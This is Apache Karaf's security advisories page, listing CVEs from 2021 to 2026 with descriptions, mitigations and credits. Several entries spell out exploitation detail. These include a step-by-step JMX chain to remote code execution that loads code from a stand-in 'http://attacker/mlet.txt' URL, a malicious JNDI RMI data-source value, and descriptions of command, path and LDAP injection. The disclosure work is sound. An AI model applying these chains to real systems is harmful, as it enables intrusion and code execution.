---
title: Apache Karaf security advisories
description: Security information for Apache Karaf
layout: single
---

# Reporting

Do you want disclose a potential security issue for Apache Karaf? Send your report to the [Apache Security Team](mailto:security@apache.org?subject=Karaf).

# Advisories

This section is experimental: it provides advisories since 2023 and may lag behind the official CVE publications. If you have any feedback on how you would like this data to be provided, you are welcome to reach out on our public [mailinglist](/mailinglist) or privately on [security@apache.org](mailto:security@apache.org)
{.bg-warning}

## Improper release of ClassLoader references via static ThreadLocal caching ## { #CVE-2026-92230 }

CVE-2026-92230 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-92230) [\[CVE json\]](./CVE-2026-92230.cve.json) [\[OSV json\]](./CVE-2026-92230.osv.json)



_Last updated: 2026-09-17T18:38:22.061Z_

### Affected

* Apache Karaf before 4.4.11


### Description

Apache Karaf's XmlUtils cached XML parser/transformer factories in static ThreadLocal fields on long-lived container threads. Because a ThreadLocal value outlives the OSGi bundle that created it, repeated bundle or feature install, update, or refresh operations can leave successive bundle ClassLoader's pinned in memory and unreachable for garbage collection, leading to unbounded Metaspace growth and eventual denial of service of the Karaf instance.

### References
* https://lists.apache.org/thread/pxgqjvsmzgpvgly1qf1w300qxsp8bxdj


### Credits
* Baoquan Cui & Yucheng Qiu (reporter)


## Authorization bypass in JMX MBean lifecycle operations ## { #CVE-2026-92142 }

CVE-2026-92142 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-92142) [\[CVE json\]](./CVE-2026-92142.cve.json) [\[OSV json\]](./CVE-2026-92142.osv.json)



_Last updated: 2026-09-29T08:40:06.994Z_

### Affected

* Apache Karaf before 4.4.12


### Description

Apache Karaf exposes a JMX MBeanServer guarded by&nbsp;<code>KarafMBeanServerGuard</code>, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a j<code>ava.lang.reflect.Proxy</code>&nbsp;around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in&nbsp;<code>MBeanInvocationHandler#guarded</code>:<div><br></div><div><code>&nbsp; private final List&lt;String&gt; guarded = Collections.unmodifiableList( Arrays.asList("invoke", "getAttribute", "getAttributes", "setAttribute", "setAttributes"));</code></div><div><br></div><div>The MBean lifecycle operations&nbsp;<code>MBeanServer#createMBean</code>,&nbsp;<code>#registerMBean</code>&nbsp;and&nbsp;<code>#unregisterMBean</code>&nbsp;are not in this list. Calls to these methods are forwarded directly to the underlying&nbsp;<code>MBeanServer</code>&nbsp;with no role check at all, regardless of the roles configured in&nbsp;<span>etc/jmx.acl.*.cfg.</span></div><div><br></div><div>As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged "<code>viewer</code>" role, can call&nbsp;<code>createMBean()</code>&nbsp;to instantiate an arbitrary class as a MBean, and&nbsp;<code>unregisterMBean()</code>&nbsp;to remove it again afterwards, with no authorization check and no audit log entry (logging in&nbsp;<code>KarafMBeanServerGuard</code>&nbsp;only occurs on the RBAC-denial path, which this bypass never reaches).</div><div><br></div><div>This is significant because&nbsp;<code>javax.management.loading.MLet</code>, a standard JDK MBean, can be instantiated this way.&nbsp;<code>MLet</code>&nbsp;acts as a remote classloader: its&nbsp;<code>getMBeansFromURL(URL)</code>&nbsp;operation fetches an&nbsp;<code>MLet</code>&nbsp;text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through&nbsp;<code>KarafMBeanServerGuard</code>'s existing "invoke" check, but the default&nbsp;<code>etc/jmx.acl.cfg</code>&nbsp;grants the "<code>viewer</code>" role to any method name matching the wildcard rule "<code>get* = viewer</code>", a heuristic intended for read-only getters. Because "<code>getMBeansFromURL</code>" happens to start with "<code>get</code>", it also matches that rule, so a default installation grants "viewer" callers permission to invoke it without any Karaf-specific ACL naming&nbsp;<code>MLet</code>&nbsp;at all. Combined with the createMBean gap, this gives a "<code>viewer</code>"-role JMX client a path to remote code execution to the Karaf JVM:</div><div><ol><li>Authenticate to JMX as any user with any role (e.g. "<code>viewer</code>").</li><li><code>mbs.createMBean("javax.management.loading.MLet", objectName)</code>&nbsp;is not in&nbsp;<code>GUARDED_OPERATIONS</code>, no RBAC check, MLet is instantiated and registered.</li><li><code>mbs.invoke(objectName, "getMBeansFromURL", new Object[]{"http://attacker/mlet.txt"}, ...)</code>&nbsp;is guarded, but the method name matches the default "<code>get* = viewer</code>" ACL rule, so permitted.</li><li>The remote&nbsp;<code>.mlet</code>&nbsp;file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.</li><li><code>mbs.unregisterMBean(objectName)</code>&nbsp;can be used to remove the MLet afterwards, also not in&nbsp;<code>GUARDED_OPERATIONS</code>, no RBAC check, no audit trail.</li></ol></div><div>The fix adds&nbsp;<code>createMBean</code>,&nbsp;<code>registerMBean</code>&nbsp;and&nbsp;<code>unregisterMBean</code>&nbsp;to the guarded operation list, resolves required roles for them from the&nbsp;<code>jmx.acl*</code>&nbsp;configuration by&nbsp;<code>ObjectName</code>&nbsp;and (for&nbsp;<code>createMBean</code>/<code>registerMBean</code>) MBean class name, and ships default&nbsp;<code>etc/jmx.acl.cfg</code>&nbsp;entries restricting all three operations to the "<code>admin</code>" role. This allows deployments to also write class-name-specific rule, e.g.:</div><div><br></div><div><code>createMBean(java.lang.String)[/javax\.management\.loading\..*/] = admin</code></div><div><br></div><div>Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-"<code>admin</code>" JMX credentiels.</div>

### References
* https://karaf.apache.org/security/cve-2026-92142.txt


### Credits
* MopMonk-AI <mopmonk-ai@tophant.com> (reporter)


## config:install missing ACL entry allows privilege escalation to admin ## { #CVE-2026-91085 }

CVE-2026-91085 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-91085) [\[CVE json\]](./CVE-2026-91085.cve.json) [\[OSV json\]](./CVE-2026-91085.osv.json)



_Last updated: 2026-09-29T08:39:32.106Z_

### Affected

* Apache Karaf before 4.4.12


### Description

Apache Karaf's shell/SSH command security is enforced by per-scope ACL configuration files (<code>etc/org.apache.karaf.command.acl.&lt;scope&gt;.cfg</code>).&nbsp;<code>SecuredSessionFactoryImpl.checkSecurity()</code>&nbsp;resolves the roles required for an invocation and, when no ACL rule matches the command, <b>fails open</b>:&nbsp;<code>ACLConfigurationParser.Specificity.NO_MATCH</code>&nbsp;sets&nbsp;<code>passCheck = true</code>. The safety valve for this,&nbsp;<code>karaf.secured.command.compulsory.roles</code>, ships commented out in&nbsp;<code>etc/system.properties</code>, so an unmatched command is allowed for any authenticated user.<div><br></div><div>The shipped&nbsp;<code>org.apache.karaf.command.acl.config</code>&nbsp;ACL (<code>assemblies/features/standard/src/main/feature/feature.xml</code>, mirrored into&nbsp;<code>instance/.../etc/org.apache.karaf.command.acl.config.cfg</code>) has no&nbsp;<code>install</code>&nbsp;entry. It restricts&nbsp;<code>delete</code>&nbsp;to&nbsp;<code>admin</code>, restricts&nbsp;<code>edit</code>/<code>property-*</code>/<code>update</code>&nbsp;on the&nbsp;<code>jmx.acl.*</code>,&nbsp;<code>org.apache.karaf.command.acl.*</code>&nbsp;and&nbsp;<code>org.apache.karaf.service.acl.*</code>&nbsp;PIDs to&nbsp;<code>admin</code>, and allows&nbsp;<code>manager</code>&nbsp;for everything else, but&nbsp;<code>config:install</code>&nbsp;was simply unmatched, and therefore allowed for any authenticated user, including one holding only the&nbsp;<code>viewer</code>&nbsp;role.</div><div><br></div><div><span>config:install &lt;url&gt; &lt;finalname&gt;</span>&nbsp;fetches&nbsp;<code>url</code>&nbsp;and writes it into&nbsp;<code>${karaf.etc}</code>&nbsp;as&nbsp;<code>finalname</code>. It calls&nbsp;<code>PathUtils.checkWithin()</code>&nbsp;to block&nbsp;<code>..</code>&nbsp;traversal outside&nbsp;<code>karaf.etc</code>, but that folder holds every security-relevant file Karaf ships:&nbsp;<code>users.properties</code>,&nbsp;<code>keys.properties</code>,&nbsp;<code>host.key</code>, and all&nbsp;<code>org.apache.karaf.*.acl.*</code>&nbsp;files, including the very ACL file that (mis)governs this command. With&nbsp;<code>-o</code>/<code>--override</code>, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.</div><div><br></div><div>Because&nbsp;<code>felix.fileinstall.dir = ${karaf.etc}</code>&nbsp;(<code>etc/config.properties</code>), Felix FileInstall also watches and reloads any&nbsp;<code>.cfg</code>&nbsp;file dropped there, closing the loop without requiring a restart.</div><div><br></div><div>By contrast,&nbsp;<code>bundle:install</code>,&nbsp;<code>feature:install</code>&nbsp;and&nbsp;<code>kar:install</code>&nbsp;are all&nbsp;<code>admin</code>-only in their own ACLs, and&nbsp;<code>config:delete</code>&nbsp;is&nbsp;<code>admin</code>&nbsp;in this same ACL,&nbsp;<code>config:install</code>&nbsp;was the outlier.</div><h3>Mitigation</h3><div>Add&nbsp;<code>install = admin</code>&nbsp;in&nbsp;<code>etc/org.apache.karaf.command.acl.config.cfg</code>&nbsp;(create the file is absent), and/or set&nbsp;<code>karaf.secured.command.compulsory.roles=admin</code>&nbsp;in&nbsp;<code>etc/system.properties</code>&nbsp;(and restart) to make unmatched commands fail closed by default.</div>

### References
* https://karaf.apache.org/security/cve-2026-91085.txt


### Credits
* Rin Ray <rindilray@gmail.com> (reporter)


## Missing authorization on the jdbc:* shell command scope allows privilege escalation to remote code execution via jdbc:ds-create ## { #CVE-2026-91048 }

CVE-2026-91048 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-91048) [\[CVE json\]](./CVE-2026-91048.cve.json) [\[OSV json\]](./CVE-2026-91048.osv.json)



_Last updated: 2026-09-29T08:34:45.991Z_

### Affected

* Apache Karaf before 4.4.12


### Description

The&nbsp;<code>jdbc</code>&nbsp;shell command scope shipped no&nbsp;<code>org.apache.karaf.command.acl.jdbc.cfg</code>. Karaf's command guard (<code>SecuredSessionFactoryImpl</code>) treats a command with no matching ACL rule as <b>allowed</b>, so any authenticated shell session (including one holding only the&nbsp;<code>viewer</code>&nbsp;role) could run every&nbsp;<code>jdbc:*</code>&nbsp;command.&nbsp;<code>jdbc:ds-create</code>&nbsp;stores a fully attacker-controlled JDBC URL into a&nbsp;<code>pax-jdbc-config</code>&nbsp;factory&nbsp;<code>Configuration</code>&nbsp;with no validation.&nbsp;<code>pax-jdbc-config</code>&nbsp;reactively turns that into a live&nbsp;<code>DataSource</code>. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2&nbsp;<code>INIT=RUNSCRIPT</code>), so a&nbsp;<code>viewer</code>-level shell user could reach arbitrary code execution, bypassing the&nbsp;<code>admin</code>-role gate that already protects&nbsp;<code>shell:exec</code>. This is a privilege-escalation-to-RCE chain, not merely an "admin misconfiguration".<div><br></div><div>The same applies to&nbsp;<code>jms:*</code>&nbsp;shell commands.</div>

### References
* https://lists.apache.org/thread/ph3867mxh2tft75w0o1hpn10f5mbmw32


### Credits
* MopMonk-AI <mopmonk-ai@tophant.com> (reporter)


## Path Traversal in Config Service Allows Manager-to-Admin Privilege Escalation ## { #CVE-2026-91012 }

CVE-2026-91012 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-91012) [\[CVE json\]](./CVE-2026-91012.cve.json) [\[OSV json\]](./CVE-2026-91012.osv.json)



_Last updated: 2026-09-29T08:34:10.036Z_

### Affected

* Apache Karaf before 4.4.12


### Description

<div><span>org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties)</span>,
which backs the "config" MBean and the config:* shell commands, derives the file
it writes a configuration to from caller-supplied input without checking that
the result stays inside&nbsp;<code>${karaf.etc}</code>:</div><div><ul><li>if the submitted property map contains a&nbsp;<code>felix.fileinstall.filename</code>&nbsp;entry, that value is turned directly into a&nbsp;<code>File</code>&nbsp;(<code>getCfgFileFromProperty</code>), so it can point to any absolute path the Karaf process can write to;</li><li>otherwise the configuration PID is concatenated verbatim into the target file name (<code>generateConfigFilename(): new File(karaf.etc, pid + ".cfg")</code>), so a PID containing ".." segments resolves outside&nbsp;<code>${karaf.etc}</code>.&nbsp;<code>createFactoryConfiguration()</code>&nbsp;has the same issue via the factory PID/alias.</li></ul><div>Both code paths are reachable by any caller holding the "manager" role under Karaf's shipped command/JMX ACL (<code>org.apache.karaf.command.acl.conf.cfg:</code>&nbsp;"<code>update = manager</code>"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to "<code>admin</code>" (<code>etc/users.properties</code>,&nbsp;<code>etc/*.acl.*.cfg</code>,&nbsp;<code>etc/org.apache.karaf.management.cfg</code>, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.</div></div><div><br></div><div><span>ConfigMBeanImpl.install()</span>&nbsp;and the&nbsp;<code>config:install</code>&nbsp;shell command already guarded the equivalent risk on their own code path with a&nbsp;<code>finalname.contains("..")</code>&nbsp;string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to&nbsp;<code>ConfigRepositoryImpl.update()</code>&nbsp;/&nbsp;<code>createFactoryConfiguration()</code>&nbsp;at all.</div>

### References
* https://lists.apache.org/thread/op8trtz1qxkdwj2rjozhd9yt2yd6nhw4


### Credits
* n0mi1k <nomilksec@gmail.com> (reporter)


## OS Command Injection in Child-Instance Launch (instance:* / InstancesMBean) ## { #CVE-2026-91006 }

CVE-2026-91006 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-91006) [\[CVE json\]](./CVE-2026-91006.cve.json) [\[OSV json\]](./CVE-2026-91006.osv.json)



_Last updated: 2026-09-28T10:44:31.268Z_

### Affected

* Apache Karaf before 4.4.12


### Description

Apache Karaf's instance-management service (<code>InstanceServiceImpl</code>) builds the command line used to launch a child Karaf JVM by string concatenation, then executes it through&nbsp;<code>/bin/sh&nbsp;</code>(Unix) or&nbsp;<code>cscript</code>&nbsp;(Windows). The caller-supplied&nbsp;<code>javaOpts</code>&nbsp;value is spliced into that string unquoted. A javaOpts value containing shell metacharacters (<code>;</code>,&nbsp;<code>|</code>,&nbsp;<code>`</code>,&nbsp;<code>$(...)</code>) is interpreted by the shell instead of being passed to the JVM as an option, giving arbitrary OS command execution as the Karaf process user.<div><br></div><div>Reachable via the shell commands&nbsp;<code>instance:create</code>,&nbsp;<code>instance:start</code>,&nbsp;<code>instance:restart</code>,&nbsp;<code>instance:change-opts</code>, and the equivalent&nbsp;<code>InstanceMBean</code>&nbsp;JMX operations (<code>createInstance</code>,&nbsp;<code>startInstance</code>,&nbsp;<code>changeJavaOpts</code>,&nbsp;<code>cloneInstance</code>).</div><h3>Mitigation&nbsp;</h3><div><ul><li>Set&nbsp;<code>karaf.secured.command.compulsory.roles=admin</code>&nbsp;in&nbsp;<code>etc/system.properties</code>&nbsp;to close the fail-open gap for all unconfigured command scopes.</li><li>Restrict which principals can reach&nbsp;<code>instance:*</code>&nbsp;commands and&nbsp;<code>InstancesMBean</code>&nbsp;via&nbsp;<code>etc/users.properties</code>&nbsp;role assignments.</li><li>Treat&nbsp;<code>javaOpts</code>&nbsp;passed to i<code>nstance:create</code>/<code>instance:start</code>/<code>instance:change-opts</code>/<code>InstancesMBean</code>&nbsp;as untrusted input only from fully-trusted operators.</li></ul></div><div><br></div>

### References
* https://lists.apache.org/thread/olzy0yjw82b20w59vonfjr1x7v5yzocr


### Credits
* n0mi1k <nomilksec@gmail.com> (reporter)


## LDAP filter injection in JAAS LDAP login modules ## { #CVE-2026-90979 }

CVE-2026-90979 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-90979) [\[CVE json\]](./CVE-2026-90979.cve.json) [\[OSV json\]](./CVE-2026-90979.osv.json)



_Last updated: 2026-09-28T09:34:23.941Z_

### Affected

* Apache Karaf before 4.4.12


### Description

<p><span>LDAPCache</span>&nbsp;and&nbsp;<code>LDAPBackingEngine</code>&nbsp;build LDAP search filters for user lookup and role lookup by textually substituting the placeholders&nbsp;<code>%u</code>,&nbsp;<code>%dn</code>, and&nbsp;<code>%fqdn</code>&nbsp;(drawn from the login name, the resolved user DN, and its fully qualified namespace form) into administrator-configured filter templates (<code>userFilter</code>,&nbsp;<code>roleFilter</code>). Before the fix, the only sanitization applied to the substituted value was double backslashed:</p><div><code>filter = filter.replaceAll(Pattern.quote("%u"), Matcher.quoteReplacement(user));</code></div><div><code>filter = filter.replace("\\", "\\\\");</code></div><div><br></div><div>This does not escape the other characters RFC 4515 requires escaping in an LDAP search filter:&nbsp;<code>*</code>,&nbsp;<code>(</code>,&nbsp;<code>)</code>, and&nbsp;<code>NUL</code>. A login name containing any of these can change the structure of the resulting filter rather than being matched as a literal value (e.g. a crafted username can turn an equality match into a wildcard match, or close/reopen filter clauses), widening what the search returns and potentially causing a login or role lookup to match an LDAP entry other than the intended one, over-granting roles, and depending on deployment-specific filter templates, potentially affecting which account a login resolved to.</div><div><br></div><div>It's not exploitable through every entry points:&nbsp;<code>LDAPLoginModule</code>&nbsp;and&nbsp;<code>LDAPPubkeyLoginModule</code>&nbsp;both called&nbsp;<code>Util.doRFC2254Encoding()</code>&nbsp;(correct RFC 4515 escaping) on the login name before handing it to&nbsp;<code>LDAPCache</code>, which masked the missing escaping in&nbsp;<code>LDAPCache</code>&nbsp;for those two call paths. Using&nbsp;<code>LDAPCache</code>&nbsp;directly (bypassing the login modules) does not reproduce through the normal&nbsp;<code>LDAPLoginModule</code>/<code>LDAPPubkeyLoginModule</code>&nbsp;authentication flow for this reason. It does reproduce through two other call paths that reach&nbsp;<code>LDAPCache</code>/<code>LDAPBackingEngine</code>&nbsp;without any prior escaping:</div><div><ul><li><code>GSSAPILdapLoginModule</code>&nbsp;passes the&nbsp;<code>NameCallback</code>&nbsp;name straight through, unescaped.</li><li><code>LDAPBackingEngine</code>&nbsp;(<code>listRoles</code>) passes&nbsp;<code>principal.getName()</code>&nbsp;straight through, unescaped.</li></ul><div><br></div></div>

### References
* https://karaf.apache.org/security/cve-2026-90979.txt


### Credits
* Gjoko Krstic <gjoko@zeroscience.mk> (reporter)


## Decanter log-socket collector has deserialization vulnerability ## { #CVE-2026-24656 }

CVE-2026-24656 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-24656) [\[CVE json\]](./CVE-2026-24656.cve.json)

_Last updated: 2026-01-26T09:41:22.803Z_

### Affected

* Apache Karaf before 2.12.0
* Apache Karaf at 2.12.0 unaffected


### Description

<p>Deserialization of Untrusted Data vulnerability in Apache Karaf Decanter.</p><br>The Decanter log socket collector exposes the port 4560, without authentication. If the collector exposes allowed classes property, this configuration can be bypassed.<br>It means that the log socket collector is vulnerable to deserialization of untrusted data, eventually causing DoS.<br><br><br>NB: Decanter log socket collector is not installed by default. Users who have not installed Decanter log socket are not impacted by this issue.<br><br><p>This issue affects Apache Karaf Decanter before 2.12.0.</p><p>Users are recommended to upgrade to version 2.12.0, which fixes the issue.</p>

### References
* https://lists.apache.org/thread/dc5wmdn6hyc992olntkl75kk04ndzx34


### Credits
* r00t4dm (finder)


## Cave SSRF and arbitrary file access ## { #CVE-2024-34365 }

CVE-2024-34365 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-34365) [\[CVE json\]](./CVE-2024-34365.cve.json) [\[OSV json\]](./CVE-2024-34365.osv.json)



_Last updated: 2024-05-09T06:49:03.305Z_

### Affected

* Apache Karaf Cave through *


### Description

** UNSUPPORTED WHEN ASSIGNED ** Improper Input Validation vulnerability in Apache Karaf Cave.<p>This issue affects all versions of Apache Karaf Cave.</p>As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users.<p>NOTE: This vulnerability only affects products that are no longer supported by the maintainer.</p>

### References
* https://karaf.apache.org/security/cve-2024-34365.txt


### Credits
* cigar (finder)


## JDBC JAAS LDAP injection ## { #CVE-2022-40145 }

CVE-2022-40145 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-40145) [\[CVE json\]](./CVE-2022-40145.cve.json) [\[OSV json\]](./CVE-2022-40145.osv.json)



_Last updated: 2022-12-21T15:53:26.357Z_

### Affected

* Apache Karaf from 4.4.0 before 4.4.2
* Apache Karaf before 4.3.8


### Description

<span style="background-color: rgb(255, 255, 255);">This vulnerable is about a potential code injection when an attacker has control of the target LDAP server using in the JDBC JNDI URL.<br><br>The function jaas.modules.src.main.java.por</span><span style="background-color: rgb(255, 255, 255);">g.apache.karaf.jass.modules.</span><span style="background-color: rgb(255, 255, 255);">jdbc.JDBCUtils#doCreateDatasou</span><span style="background-color: rgb(255, 255, 255);">rce</span><br><span style="background-color: rgb(255, 255, 255);">use InitialContext.lookup(jndiName</span><span style="background-color: rgb(255, 255, 255);">) without filtering.<br>An user can modify&nbsp;</span><span style="background-color: rgb(255, 255, 255);">`options.put(JDBCUtils.DATASOU</span><span style="background-color: rgb(255, 255, 255);">RCE, "osgi:" +&nbsp;</span><span style="background-color: rgb(255, 255, 255);">DataSource.class.getName());` to `options.put(JDBCUtils.DATASOU</span><span style="background-color: rgb(255, 255, 255);">RCE,</span><span style="background-color: rgb(255, 255, 255);">"jndi:rmi://x.x.x.x:xxxx/Comma</span><span style="background-color: rgb(255, 255, 255);">nd");` in JdbcLoginModuleTest#setup.</span><br><br><span style="background-color: rgb(255, 255, 255);">This is vulnerable to a remote code execution (RCE) attack when a</span><br><span style="background-color: rgb(255, 255, 255);">configuration uses a JNDI LDAP data source URI when an attacker has</span><br><span style="background-color: rgb(255, 255, 255);">control of the target LDAP server.</span><p>This issue affects all versions of Apache Karaf up to 4.4.1 and 4.3.7.</p>We encourage the users to upgrade to Apache Karaf at least 4.4.2 or 4.3.8

### References
* https://karaf.apache.org/security/cve-2022-40145.txt


### Credits
* Xun Bai <bbbbear68@gmail.com> (reporter)


## Path traversal flaws ## { #CVE-2022-22932 }

CVE-2022-22932 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2022-22932) [\[CVE json\]](./CVE-2022-22932.cve.json) [\[OSV json\]](./CVE-2022-22932.osv.json)



_Last updated: 2022-01-25T14:53:17.546Z_

### Affected

* Apache Karaf from Apache Karaf before 4.2.15


### Description

Apache Karaf obr:* commands and run goal on the karaf-maven-plugin have partial
path traversal which allows to break out of expected folder.

The risk is low as obr:* commands are not very used and the entry is set by user.

This has been fixed in revision:

https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4
https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf

Mitigation: Apache Karaf users should upgrade to 4.2.15 or 4.3.6
or later as soon as possible, or use correct path.

JIRA Tickets: https://issues.apache.org/jira/browse/KARAF-7326

### References
* https://karaf.apache.org/security/cve-2022-22932.txt


### Credits
* This issue was discovered and reported by GHSL team member Jaroslav Lobacevski


## Insecure Java Deserialization in Apache Karaf ## { #CVE-2021-41766 }

CVE-2021-41766 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2021-41766) [\[CVE json\]](./CVE-2021-41766.cve.json) [\[OSV json\]](./CVE-2021-41766.osv.json)



_Last updated: 2022-01-25T14:39:43.793Z_

### Affected

* Apache Karaf from Apache Karaf before 4.3.6


### Description

Apache Karaf allows monitoring of applications and the Java runtime by
using the Java Management Extensions (JMX).
JMX is a Java RMI based technology that relies on Java serialized
objects for client server communication.
Whereas the default JMX implementation is hardened against
unauthenticated deserialization attacks, the implementation
used by Apache Karaf is not protected against this kind of attack.

The impact of Java deserialization vulnerabilities strongly depends
on the classes that are available within the targets
class path. 
Generally speaking, deserialization of untrusted data does always 
represent a high security risk and should be prevented.

The risk is low as, by default, Karaf uses a limited set of classes in the JMX server class path.
It depends of system scoped classes (e.g. jar in the lib folder).

### References
* https://karaf.apache.org/security/cve-2021-41766.txt


### Credits
* This issue was reported by Daniel Heyne, Konstantin Samuel and Tobias Neitzel.
